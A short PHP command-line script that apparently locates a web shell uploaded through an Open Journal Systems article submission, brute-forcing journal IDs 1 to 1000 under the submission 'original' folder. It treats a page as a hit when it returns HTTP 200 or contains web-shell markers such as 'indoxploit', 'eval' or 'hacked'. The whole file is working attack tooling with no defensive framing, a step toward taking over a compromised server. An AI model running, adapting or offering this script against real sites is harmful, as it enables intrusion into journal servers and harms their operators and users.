<?php
set_time_limit(0);
//error_reporting(0);
function ngcurl($url) {
	$ch = curl_init($url);
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	return curl_exec($ch);
	  	  curl_close($ch);
}
function respon_code($url) {
	$ch = curl_init($url);
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$res = curl_exec($ch);
	return curl_getinfo($ch, CURLINFO_HTTP_CODE);
	  	  curl_close($ch);
}

$url = $argv[1];
$shell = $argv[2];
$pecah = explode("-", $shell);
$id = $pecah[0];
if(isset($url) AND isset($shell)) {
	for($x = 1; $x <= 1000; $x++) {
		$link = "$url/files/journals/$x/articles/$id/submission/original/$shell";
		$cek = ngcurl($link);
		if(preg_match("/shell|newfile|newfolder|pass|password|text|indoxploit|upload|eval|php|hacked|linux|windows|by|here/i", $cek) OR respon_code($link) == "200") {
			echo "-> $link\n";
			break;
		}
	}
}
?>
